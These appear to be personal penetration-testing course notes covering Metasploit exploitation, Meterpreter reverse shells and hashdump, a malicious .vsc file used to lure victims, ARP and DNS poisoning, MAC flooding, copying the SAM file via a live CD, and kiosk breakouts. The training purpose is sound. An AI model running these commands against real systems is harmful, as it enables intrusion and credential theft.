- You will obtain Meterpreter reverse shell (terminal prompt) on target Windows system. Then, use the Meterpreter’s hashdump command to extract password hashes.
  Syntax: meterpreter > hashdump

![image-20210825181601273](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825181601273.png)

- After fetching the hashes, you can use password cracker tools such as **Hashcat** to crack the obtained hashes.

### Try to Exploit Buffer Overflow Vulnerability on Windows

A buffer overflow involves overriding the crucial registry portions and modifying internal variables with random values to control the execution of the process or to crash it completely. Stack buffer overflow overflows the registry stack, and when you send large number of specially crafted packets to the vulnerable application, it executes the arbitrary code, allowing you to successfully overflow the stack and take over the machine.

- Identify the existence of local buffer overflow vulnerability. To perform buffer overflow attack, identify the existence of local buffer overflow vulnerability or any application that is vulnerable to buffer overflow attacks. You can search and download the vulnerability from the Exploit Database. For example, as shown in the screenshot, download the VideoCharge Studio 2.12.3.685—Local Buffer Overflow (SEH) exploit which can enable a stack-based buffer overflow attack on target Windows machine. VideoCharge Studio allows remote user to gain privileges via a malicious file, that is, a
  .vsc file.

![image-20210825182030035](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825182030035.png)



- After identifying the vulnerable application for buffer overflow that exists on the target Windows, you can exploit the victim machine remotely by executing arbitrary code on the target machine by luring the victim to download and execute the created malicious .vsc file.

  Follow the below steps to create payload in Metasploit:

  - Open the Parrot terminal and type msfconsole
  - Now, type, use exploit/windows/fileformat/videocharge_studio
  - Then, type, set payload windows/meterpreter/reverse_tcp
  - Then, set the lhost by using command set lhost [Local IP]
  - After configuring Lhost, create the .vsc malicious payload by executing exploit. Then, you can see that the msf.vsc malicious file will be saved at /root/.ms4/local/location.

![image-20210825182352083](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825182352083.png)

- After creating the payload, you need to set up a listener to handle reverse connection that is sent by the victim machine when the exploit is executed successfully.

  Follow the below steps to set up a listener:

  -  use exploit/multi/handler
  -  set payload windows/meterpreter/reverse_tcp
  -  set lhost <local IP address>
  -  exploit

- After enabling the listener, send the payload to target victim machine and trick the victim to download and run the file. The execution of VideoCharge Studios malicious file on the target machine will crash due to buffer overflow. 

![image-20210825182652517](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825182652517.png)

- As soon as the victim downloads or opens the malicious file, you can access Meterpreter shell of the victim computer on the listener that you have enabled earlier. You will also gain access to Windows using Remote Shell.

![image-20210825182804130](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825182804130.png)

### Metasploit

- Most popular
- Extensive exploit library
- Scanning auxiliary modules
- Comprehensive types of payloads
- Written in Ruby an interpretive language

#### Finding Exploits in Metasploit

- Use the search feature

  - Can locate exploits and scanner modules

    ```
    msf6 > search ms17-010
    
    Matching Modules
    ================
    
       #  Name                                      Disclosure Date  Rank     Check  Description
       -  ----                                      ---------------  ----     -----  -----------
       0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
       1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
       3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
       4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
    ```

#### Exploit Wordpress with Metasploit

- Use wpscan to find vulnerable plugins

  ```
  wpscan --url <Path to App> --enumerate p
  ```

  ![image-20210825183824858](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825183824858.png)

#### Locate the Plugin Exploit

- Search InBoundio

- Use exploit/unix/webapp/wp_inboundio_marketing_file_upload

  ```
  msf6 > search InBoundio
  
  Matching Modules
  ================
  
     #  Name                                                    Disclosure Date  Rank       Check  Description
     -  ----                                                    ---------------  ----       -----  -----------
     0  exploit/unix/webapp/wp_inboundio_marketing_file_upload  2015-03-24       excellent  Yes    Wordpress InBoundio Marketing PHP Upload Vulnerability
  
  
  Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_inboundio_marketing_file_upload
  ```

- Exploiting InBoundio

  ![image-20210825184358774](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825184358774.png)

#### Metasploit Auxiliary

- There are a number of modules that can be used for scanning etc.
- Use auxiliary/scanner/http/wordpress_login_enum

![image-20210825184850733](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825184850733.png)

#### Metasploit Ranking

- Identifies the success rate of the exploit

- Preference is great or better

  - Can still attempt, but success rate goes down

- Remember exploitation is not 100%!

#### Targets

Not all targets will have exploit code

- Document and move on

- Write your own

Auto may not work

![image-20210826084845817](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826084845817.png)

#### Payload

- There are an extensive number of payloads in Metasploit
- By default Metasploit gives you a meterpreter shell
  - Might not be successful
  - When the payload fails
    - Select another
      - Generic bind shell is usually easiest

![image-20210826085416563](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826085416563.png)

#### Shell Options

- Default Metasploit port is 4444
- Change it to something else
  - NTP
    - 123
- Want a port that is not proxied and can egress out
  - Makes 80 etc. bad choices in most cases
- Set Iport 123

#### Reverse Shell

- The victim sends the shell back to you
- Required for egressing out of a firewalled or filtered environment

```
msf6 > use exploit/windows/smb/ms06_025_rasmans_reg
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms06_025_rasmans_reg) > show options 

Module options (exploit/windows/smb/ms06_025_rasmans_reg):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<p
                                       ath>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  router           yes       Rawr.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.101.116  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2000 SP4
```

#### Meterpreter Shell

- Loaded into memory
- Privilege escalation routines
- Automated enumeration from victims
- Complex uploads and downloads
- Process migration
- Can load as a persistent service => meterpreter > run metsvc
- Ability to grab password files
- Facilities to route new attacks through first victim

#### Metasploit Staged Payloads

STAGED - WINDOWS/METERPRETER/REVERSE_TCP

- Payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger
- Used in exploit scenarios due to the fact that binary exploitation often results in very little space for
  shellcode to be stored
- Initial shellcode (often referred to as stage0) may create a new connection back to the attacker's
  machine and read a larger payload into memory

#### Metasploit Staged Payloads in Memory

![image-20210826091048041](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826091048041.png)

#### Staged Payload Size

- The size required for the staged payload can be a problem, an example is as follows:

  - Stage0: large buffer of junk plus approximately 350b of shellcode

  - Stage1: metsrv DLL approximately 755kb

  - Stage2: stdapi DLL approximately 370kb

  - Stage3: priv DLL approximately 115kb

- This weighs in at a grand total of approximately 1,240kb! Not a small amount

#### Metasploit Stageless Payload CF

- A binary that includes all of the required parts of Meterpreter, along with any required extensions, all
  bundled into one

  ![image-20210826091921386](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826091921386.png)

#### Metasploit Architecture

![image-20210826092112916](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826092112916.png)

- **REX**

  Handlesall core functions

  - Socket connections and all raw functions

- **MSF CORE**
  Provides the basic API and core that describes the framework

- **MSF BASE**
  Provides Additional support to modules

- **Payloads**
  This is used to carry out operations such as connecting to or from the target system after exploitation or performing a specific task such as installing a service and so on. Payload execution is the next step after the system is exploited successfully

- **Auxiliary**
  Auxiliary modules are a special kind of module that performs specific tasks such as information gathering, database fingerprinting, scanning the network in order to find a particular service and
  enumeration, and so on

- **Encoders**

  Encoders are used to encode payloads and the attack vectors in order to evade detection by antivirus
  solutions or firewalls

- **NOPs** (No Operations)

  NOP generators are used for alignment which results in making exploits stable 

- **Exploits**

  The actual code that triggers a vulnerability

#### Metasploit Libraries

- Currently, we have core libraries for exploits, payload, post-exploitation, encoders, and various other
  modules

```
┌─[root@parrot]─[/usr/share/metasploit-framework/lib/msf/core/exploit]
└──╼ #ls -X
cmd_stager  auto_target.rb    egghunter.rb      java_deserialization.rb  oracle.rb      rop_db.rb
format      brute.rb          exe.rb            java.rb                  pdf_parse.rb   seh.rb
local       brute_targets.rb  file_dropper.rb   jsobfu.rb                pdf.rb         sqli.rb
powershell  capture.rb        fileformat.rb     kernel_mode.rb           php_exe.rb     tftp_server.rb
remote      cmd_stager.rb     format_string.rb  local.rb                 powershell.rb  view_state.rb
sqli        dect_coa.rb       git.rb            ntlm.rb                  remote.rb      wbem_exec.rb
android.rb  dhcp_server.rb    http.rb           omelet.rb                riff.rb        windows_constants.rb
```

#### Metasploit Skelethon Module

```
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super (update_info(info,
      ‘Name’ => 'Module name',
      ‘Description’ => %q{
        Say something that the user might want to know.
	  },
	  'Author’ => [ 'Name' ],
      ‘License’ => MSF_LICENSE
    ))  
  end
  def run
    # Main function
  end
end
```

#### Sample Module

- Let's work with a simple module for an HTTP version scanner and see how it actually works
- The path to this Metasploit module is:
  /modules/auxiliary/scanner/http/http_version.rb

#### Module Breakdown Part One 

- The path to all the files from the /lib/rex/proto/http directory is now available to the module
- All these files contains a variety of HTTP methods, which include functions to set up a connection, the GET and POST request, response handling

```
┌─[root@parrot]─[/usr/share/metasploit-framework/lib/rex/proto/http]
└──╼ #ls -X
handler  packet  client.rb  client_request.rb  handler.rb  packet.rb  request.rb  response.rb  server.rb
```

#### Module Breakdown Part Two 

- This section includes all the necessary library files that contain methods used in the modules

![image-20210826101016581](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826101016581.png)

#### Module Breakdown Part Three

- This part of the module defines the initialize method, which initializes the basic parameters such as Name, Author, Description and License for this module and initializes the WMAP parameters as well

![image-20210826101515809](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826101515809.png)

#### Module Breakdown Part Four

- This contains the code components of the scanner

![image-20210826102052963](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826102052963.png)

#### Metasploit Exploits

- Uses Ruby classes and mixins
- Process
  - Modify a template
  - Add classes and initialize

#### Metasploit Mixins

- Capture - Sniff network packets
- Lorcon - Send raw Wifi frames
- MSSAQL - Talk to Microsoft SQL servers
- Kernel Mode - Exploit kernel bugs
- SHE - Structured exception handling
- NDMP - The network backup protocol
- EggHunter - Memory search
- FTP - Talk to FTP servers
- FTPServer - Create FTP servers

#### Initialization Method

- Name
- Description
- Payload parameters
- Target information

![image-20210826102525070](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826102525070.png)

#### Add an Exploit to Metasploit

- Exploits we create are not in Metasploit
- If anew exploit comes out we have to get it into Metasploit
  - Download or copy it
  - Place it in the location within Metasploit
    - Default
      - /usr/share/Metasploit-framework/modules/exploits

```
#cd /usr/share/metasploit-framework/modules/exploits/
┌─[root@parrot]─[/usr/share/metasploit-framework/modules/exploits]
└──╼ #ls
aix        bsd     example_linux_priv_esc.rb  example_webapp.rb  hpux   mainframe  openbsd  solaris
android    bsdi    example.py                 firefox            irix   multi      osx      unix
apple_ios  dialup  example.rb                 freebsd            linux  netware    qnx      windows
┌─[root@parrot]─[/usr/share/metasploit-framework/modules/exploits]
```

#### Uploading into Metasploit

- Once we have copied the exploit into the folder
- We need to reload Metasploit so it knows about the exploit
  - reload_all

![image-20210826103243472](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826103243472.png)

#### Repetitive Tasks 

- Any professional will script their attacks, you can create a file with the commands in and copy paste it into the msfconsole
- Resource Scripts
  - Easy way for you to automate repetitive tasks in Metasploit
  - Just like batch scripts
  - Contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit


#### Resource Scripts

- To create a resource script

  ```
  makerc
  ```

  ![image-20210826103734360](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826103734360.png)

  ![image-20210826103803818](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826103803818.png)

- To run a resource script

  ```
  ./msfconsole -r <path to resource script>
  ```



### Unix/Linux Exploitation

After identifying the vulnerabilities related to the target operating system, if you find the installed OS on the victim machine is UNIX/LINUX, then you need to attempt various techniques to exploit the UNIX/LINUX operating system to gain the root access or escalate privileges.

#### Identify Local/Remote Exploit to Gain Root Access

- Search for local/remote exploit to gain access to vulnerable Unix/Linux systems 

![image-20210826104352702](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826104352702.png)

#### Try to Gain Access to Linux using Remote Shell

- Identify the vulnerabilities on a specific version of Unix/Linux OS
- Search the exploits that will provide remote shell to the target
- Try to exploit the target Unix system to gain remote shell
- After successful attempt to gain remote shell to target machine, list out the directories and files
  that exist on the remote system with ls command

![image-20210826105225612](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826105225612.png)

#### Extract User Accounts

Navigate to /etc/passwd file to extract all the user accounts of the remote system

![image-20210826105758875](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826105758875.png)

**Extract User Accounts**
The root user owns the etc/passwd file. All the users can read the file, but only the root user has writable permissions.
The etc/passwd file contains the following information:

- User name

- Encrypted password

- User ID number (UID)

- User's group ID number

- Full name of the user (GECOS)

- User home directory

- Login shell

Navigate to /etc/passwd file to extract all the user accounts of the remote system.

### Other Internal Network Exploitation Techniques

Apart from the exploitation techniques that are mentioned in the previous sections, you can
also attempt various other exploitation techniques to escalate privileges or gain access to the
target machine present in the network.

#### Attempt Replay Attacks

1. Using a replay attack, an attacker intercepts and passively listens to the network traffic and resends the stream —., to one or more of the parties
2. It sniffs the password hashes off the wire and replays the same password on the target machine
3. Tools: LOphtcrack, Ophcrack, RainbowCrack, etc.

![image-20210826112714359](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826112714359.png)

You can use tools like LOphtCrack, RainbowCrack, Cain & Abel, and OphCrack for this attack:

**LOphtCrack**
Source: http://www./Ophtcrack.com
This tool allows you to recover, assess, and decode hashes and judge passwords through password scanning, dictionary lookup, and brute-force attacks.

**RainbowCrack**
Source: http://project-rainbowcrack.com
The RainbowCrack hash cracker tool audits password policies. This tool operates by comparing the precalculated password hash value with that of the operating system. RainbowCrack runs on both Windows and Linux machine; you can download Windows version of RainbowCrack from the following link http://project-rainbowcrack.com

**Cain & Abel**
Source: http://www.oxid.it
Passwords can be sniffed using the Cain & Abel tool. This password recovery tool uses password calculators and decoders to crack common hashes and specific authentication hashes, as well as to calculate common hash algorithms.

#### Attempt ARP Poisoning

Attempt ARP poisoning on the router. ARP poisoning technique can be used to sniff through a switch. ARP resolves IP addresses to MAC (hardware) addresses. When a network device sends an ARP request, it does not verify whether the ARP reply received came from the intended device. In fact, many operating systems implement ARP so trustingly that devices that have not made any ARP requests will still accept ARP replies from other devices.

You can craft a malicious ARP reply that contains arbitrary IP and MAC addresses. Because the victim computer blindly accepts the ARP entry into its ARP table, this reply can force the victim computer to think that any IP is related to the MAC address you want. You can broadcast this faked ARP reply to the victim’s entire network. 

The diagram shown in the below figure depicts how the ARP poisoning is performed.

![image-20210826113123817](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113123817.png)

Following are the tools used to perform ARP poisoning:

##### Cain & Abel

Source: http://www.oxid.it
Cain & Abel is a password-recovery tool for Windows. It recovers passwords by sniffing the network, cracking encrypted passwords (using dictionary, brute-force, and cryptanalysis attacks), recording VoIP conversations, decoding scrambled passwords, recovering wireless-network keys, revealing password boxes, uncovering cached passwords, and analyzing routing protocols. The program does not exploit any software vulnerabilities or bugs that are not easy to fix. It covers some security aspects or weaknesses present in a protocol’s standards, authentication methods, and caching mechanisms.

![image-20210826113306703](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113306703.png)

**Steps for ARP Spoofing with Cain and Abel**

- Open the Cain and Abel tool and click on Configure to ensure that your device is ON
- Configuration Dialog box opens, click on the Sniffer tab, and select the adapter.
- After selecting the adapter, next click on Start/Stop Sniffer icon in the toolbar as shown below.

![image-20210826113509810](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113509810.png)

- Next click on Sniffer tab in the toolbar and then click on “+” blue button on the toolbar to add the hosts on the network.
- MAC Address Scanner window will open; select the Range radio button and specify the range of IP address which you want to scan.
- After specifying the range, check the All Tests check box and click on OK.

![image-20210826113647766](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113647766.png)

- The application begins ARP tests on the IP address range and displays in the Sniffer window as shown below.

![image-20210826113809332](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113809332.png)

- After completion of test, all MAC and their associated IP address that respond to the ARP requests are displayed.
- Now click on APR at the bottom of the tool, click anywhere on the topmost section (in the right pane) to activate the + icon.

![image-20210826113933809](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826113933809.png)

- When the New ARP Poison Routing window opens, select the IP address between which you want to intercept traffic.
- After selecting the first target, a list of IP address excluding first target appears on right pane. Now select the second IP address as shown below.

![image-20210826114359039](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826114359039.png)

- The selected targets appear on the top section, now click on Start/Stop APR button to initiate ARP poison routing attack.
- After selecting the option, the status of targets changes from Idle to Poisoning as shown below.

![image-20210826114531181](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826114531181.png)

#####  WinArpAttacker

WinArpAttacker scans, attacks, detects, and protects computers on a LAN. It sends IP conflict packets to target computers as fast as possible and diverts all communications. 

It can perform the following attacking actions:

- Arp flooding
- BanGateway
- IPConflict
- SniffGateway
- SniffHosts
- Snifflan

![image-20210826114756349](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826114756349.png)

##### Arpspoof

Source: https://su2.info
The arpspoof tool comes with the Dsniff collection of tools. Arpspoof redirects packets from a target host (or all hosts) on the LAN to another host on the LAN by forging ARP replies. This is an effective way of sniffing traffic on a switch.

##### Arpoison

Source: http://www.arpoison.net
This UNIX-based command-line tool creates ARP replies. It sends spoofed ARP replies to the target by specifying source and destination IP and MAC addresses.

##### Ettercap

Source: http://ettercap.sourceforge.net
Ettercap allows you to sniff live LAN connections. This tool automates all operations. 

Steps for ARP poisoning using Ettercap:

Ettercap supports Debian/Ubuntu, Gentoo, Pentoo, and Fedora operating systems and it can be installed on other Linux versions and also on Windows.

- First open the Linux terminal and type the command to install Ettercap:

  ```
  sudo apt-get install ettercap
  ```

- Install some dependencies to enable Ettercap to work properly

  ```
  # sudo apt-get install debhelper cmake bison flex libgtk2.0-dev libltd13-dev libncurses-dev libncurses5-dev libneti-dev libpcap-dev libpcre3-dev libssl-dev libcurl4-openssl-dev ghostscript
  ```

- Ettercap run in two modes:

  - Text mode

  - GUI mode

- Type the following command to install GUID mode:

  ```
  ettercap -G
  ```

  **Note**: It provides four user interfaces:

  - -T use text only GUI

  - -C use curses GUI

  - -D daemonize Ettercap (no GUI)

  - -G use GTK + GUI

- The above command opens the Ettercap main window, now select the interface. After selecting the interface, scan the hosts to see all the live hosts and carefully select the targets from the list.

- After selecting the two targets from the list, go to MITM and click ARP poisoning, thereafter check the “Sniff remote connections” from the MITM attack: ARP poisoning dialog box as shown below.

![image-20210826140758778](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826140758778.png)

- In the next step, click on “start sniffing” that enables the ARP poisoning in the network

- If any victim has signed into some website, the results can be seen in the toolbar of Ettercap as shown below

![image-20210826141445208](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826141445208.png)

#### Attempt Mac Flooding 

- MAC flooding is an ARP cache poisoning technique aimed at network switches

- Flood the CAM table on the switch with fake MAC address and IP pairs until it is full

- This will change the behavior of the switch to reset it to its learning mode, broadcasting on every port, similarly to a hub_

  ![image-20210826141952386](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826141952386.png)

##### Macof

Source: https://sectools.org

The macof tool allows you to flood the LAN switch with random MAC addresses. Macof floods the LAN switch with 150,000 Ethernet packets per minute and tries to alter routing or ARP tables. Changes in these tables facilitate sniffing and entering the network. Macof tool comes in handy during penetration testing; this can be used when some switches do not allow to spoof arp packets; in such cases, this tool helps to check if the switch is overloaded.

Syntax: # macof [-i interface] [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-n times]

Options:

-i [interface to send on]

-s [source IP address]

-d [destination IP address]

-e tha [target hardware address]

-x sport [TCP source port]

-y dport [TCP destination port]

-n times [number of packets to send]

- To perform simple flooding using macof, use the following command:

```
macof -i eth1 -n 15
```

![image-20210826142445162](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826142445162.png)

- To perform targeted flooding using macof, use the following command:

  ```
  macof -i ethO -d [IP address] -n 25
  ```

  ![image-20210826142631201](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826142631201.png)

#### Conduct a Man-in-the-Middle Attack

- One of the most successful methods for gaining control of customer information and resources is through Man-in-the-Middle attacks
- In this attack, the attacker is situated between the customer and the real web-based application and proxies all communications between the systems

![image-20210826143014397](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826143014397.png)

MITM attacks can be conducted inside the network by using the following techniques:

- **DNS cache poisoning**

  You can send false replies to DNS server requests for IP addresses. The tester can then try to direct the victim system to a fake site.

  The following tools can be used to carry out DNS cache poisoning:

  - **DNSA**

  - **Dnsspoof**

  - **TinyDNS**

  - **DNSCache**

    

- **ARP spoofing**

  You can send spoofed ARP replies to application systems, identifying them as coming from the victim’s system. Similarly, you can send spoofed ARP replies to the victim’s system, identifying them as coming from the application system.

  **ARP spoofing attacks**

  Basically, ARP spoofing used to steal the confidential data from companies, apart from this ARP spoofing attacks, can be used in other attacks like:

  - **Denial-of-service attacks**
    ARP spoofing attack helps in linking multiple IP address in a LAN with a single target’s MAC address due to which the traffic directed to different IP address is redirected to the single target’s MAC address and results in overloading the target with traffic.
  - **Session hijacking**
    With the help of ARP spoofing, the session IDs can be easily stolen, thus allowing you to access the confidential data.

- MITM **attacks**
  MITM attacks can be performed by using ARP spoofing to intercept and/or to modify traffic between the two victims.

  ![image-20210826143642149](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826143642149.png)

Similar steps of a typical ARP spoofing include:

* You must download some of the popular ARP spoofing software, such as arpoison, arpspoof, Ettercap, and Parasite; after downloading the tool, you must set the tool’s IP address to match the IP address of a target.
* You can use tool and scan for MAC and IP addresses of hosts in the target’s subnet.
* After choosing the target, you can start sending ARP packet across the LAN which contains victim’s IP address and your MAC address.
* The other hosts on the LAN cache the spoofed ARP packets; the data from that hosts to the victim will directly go to you instead of victim. By this, you have successfully launched the ARP spoofing on target host.

#### Attempt DNS Poisoning 

- Domain Name System (DNS) resolves domain names into IP addresses

- It is also called DNS cache poisoning

- Using a DNS poisoning attack, an attacker injects fake records into the cache of a DNS server, corrupts the DNS tables, and redirects a victim to the malicious IP address

- It is mainly done by sending spam emails, ad banners, etc. that attract users to click on them 

Here is how it works:

- Every system has a hosts file in its systems directory; in the case of Windows, this file resides at the following location:

  - C:\Windows\System32\drivers\etc

- This file can be used to hard-code domain name translations and direct you to a different site

The following tools are used to carry out DNS cache poisoning:

##### Dnsspoof

Source: https://github.com
This tool can be obtained with the Dsniff package of tools. You can forge replies to DNS queries on the LAN by using this tool.

##### DNSA

Source: http://packetfactory.openwall.net
This is a Linux-based DNS security tool that is used for injecting forged DNS packets. 

Usage: ./dnsa [ARGS] 

-3DNS cache poisoning [Required: -S AND -b AND -a]

-a [host.domain.org] -Hostname to send in the additional record
-b [IP]-IP to send in the additional record
-D [www.domain.org]-Hostname for query. Use it if you want to fool just on
-S [IP]-IP address to send for DNS queries (the normal one)
-s [IP]-IP address of the server to fool
-i [interface] -IP address to send for DNS queries
-h -Print usage

##### Example of a Normal Host File under DNS Poisoning Attack

You can poison the IP address DNS entries and replace them with the IP address of a server that is already being controlled; the change can be seen in the below screenshot.

![image-20210826151802157](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826151802157.png)



#### Try to Log into a Console Machine

Try to log in to a remote console machine by using default passwords, as shown in the figure

![image-20210826152014982](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826152014982.png)

Following are some of the easily guessable passwords to log in to a console machine:

- Blank passwords or no passwords
- Name of the user
- Similar or same passwords for all the systems in the network
- The name of the host
- Password related to a detail about the user
- Last name as password
- Temporary passwords (which may be the same for all systems)
- Password reminders are also helpful when trying to guess passwords.

#### Boot the PC using Alternate OS and Steal the SAM File

You can attempt to bypass system authentication by booting the PC using another operating system, such as Knoppix. Knoppix is an open-source live Linux CD. This Linux software is used to boot and run the PC using only the CD.

You can then use the following steps to steal the SAM file using the alternate operating system:

- Boot the system using Knoppix: Insert the Knoppix Live Linux CD and boot the system.
- Mount the system drive: Identify the system drive and mount it.
- Copy the SAM file to a pen drive: Screenshot in the given below shows the commands for mounting the system drive and copying the SAM file to a pen drive.
- Shutdown the system and remove the Knoppix CD: Also, remove the pen drive on which the SAM file was copied.

```
#mount -t vfat -o ro /dev/hdal /mnt/hdal
#cd /mnt/hdal/windows/system32/config/sam
#cp sam /dev/fd0
#umount /dev/hdal
#halt
```

#### Try to Break Down the Desktop Lockdown

Try to break down desktop lockdown security in Windows or Citrix Environment. By breaking down lockdown security, you can escalate privileges in Windows or Citrix Environment. 

Use some of the following techniques to breakdown the lockdown security: 

- **Dialog Box**
  - Acquire a dialog box using the keyboard shortcuts and application functionality.
  - Dialog boxes can allow the users to perform additional functions such as Windows Search.
  - They also help users to explore the system, escalate privileges, create new files, open a new Windows Explorer instance, explore context menu, etc.
  - Different methods of obtaining a dialog box include:
    - **Application functionality**: Use application functions such as save, save as, open, load, browse, import, export, help, search, scan, and print to open a dialog box.
    - **Shortcut keys**: Use shortcuts keys such as Ctrl + O for open and Ctrl + N for new.****

![image-20210826153331357](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826153331357.png)

- Abusing the dialog box
  - Use the opened dialog box to escalate privileges through the following steps:
    - Create batch files: Right click > New > Text File > rename to .BAT (or .CMD) > edit > open.
    - Create shortcuts: Right click > New > Shortcut > ““WINDIR%\system32.”
    - Open anew Windows Explorer instance: Right click any folder > select “Open in
      new window.”
    - Explore context menus: Right click any file/folder and explore context menus.
    - Bypass file restrictions: Enter *.* or *.exe in “File name” box to view the executable files, right click on the file, and select open and run.

![image-20210826153646785](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826153646785.png)

#### Sticky keys popup

- Pressing down the shift button five times to obtain sticky keys popup

  ![image-20210826153906637](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826153906637.png)

- Click on the “Go to the Ease of Access Center to disable the keyboard shortcut” link.

- The Ease of Access Center window will allow to access explorer functionality through the address bar.

![image-20210826154041503](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826154041503.png)

- **Use task manager**
  - Access the Windows Task Manager from the Start Menu or by pressing the Ctrl + Alt Delete or Ctrl + Shift + Escape keys simultaneously.
  - Use the task manager to run new processes or commands.

- **Access Help Menu**
  - Select the F1 button from the key board to access Microsoft help menus.
  - Use the links presented in Help Menu to access command prompt or other explorer functionality.

- **Command Prompt**
  - Command shell allows users to control certain functions of an operating system and escalate privileges.
  - Use the Run option by clicking the Windows button with R key.
  - Browse to the C:\windows\system32 folder, right click on the cmd.exe, and select Open as administrator option
  - Type the hyperlink file:///c:/Windows/System32/cmd.exe in the address bar.
  - Interactive and management consoles such as powershell.exe, FTP.exe, MMC.exe, Control.exe, RUNDLL32.exe, MSTSC.exe, and WMIC.exe can also help in breaking out of the locked down desktops.

- **Citrix ICA Hotkeys**
  - Use default Citrix hotkeys such as Ctrl + F1 to go the task manager, F1 to display online help, Ctrl + Alt toggle the console display between full screen mode and window mode, and Shift + F2 to toggle the applications from full screen and window mode.

- **Modifying ICA Files**
  - Citrix applications used for desktop lockdown require independent computing architecture (ICA) files to store the network settings.
  - These applications also use internal applications to define different functions.
  - Modify the parameters of such ICA files if the applications do not have password
    lock.

- **Internal Explorer Breakouts**
  - Lockdown applications access the desktops through browsers, such as edge and chrome.
  - Breakout of such applications using address bar, search menus, help menus, and print menus

- **Default/Weak Credentials**
  - Lockdown applications may also use default passwords and credentials for administrator logins.
  - Try different default usernames and passwords to gain access to these applications.

#### Escalate User Privileges

Operating systems have built-in security systems that protect them from unauthorized access. For this purpose, different types of users and user groups can be created with varying system access powers such as administrator and user. A normal user does not have the privileges to access all the resources of the system. Attackers generally try to get into a system as a normal user with limited privileges, and after entering the attacked system, try to escalate their privileges so that they can further compromise the system. So, as a penetration tester, attempt to escalate user privileges to the level of administrator.

#### Active@ Password Changer

Source: https://www.password-changer.com

Active@ Password Changer Professional is an easy to use application that lets you reset user account passwords. It does exactly what it says, maybe even a bit more with its additional features.

Features

- Recovers passwords from multiple partitions and hard disk drives.

- Detects and displays all Microsoft Security Databases (SAM).

- Displays full account information for any local user.

![image-20210826155140324](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210826155140324.png)

##### BeRoot

Source: https://github.com

This tool is mainly used to check any common Windows misconfiguration to discover any way to escalate the user privileges. It is a post-exploitation module which will execute in the memory without touching the disk. It is used only to detect but not to exploit; in case if anything is found, then templates could be used to exploit it. To use it, create test.bat file located next to the / DLL used, it will execute once it is called. It may
not work based on the redistributable packages installed on the target host.

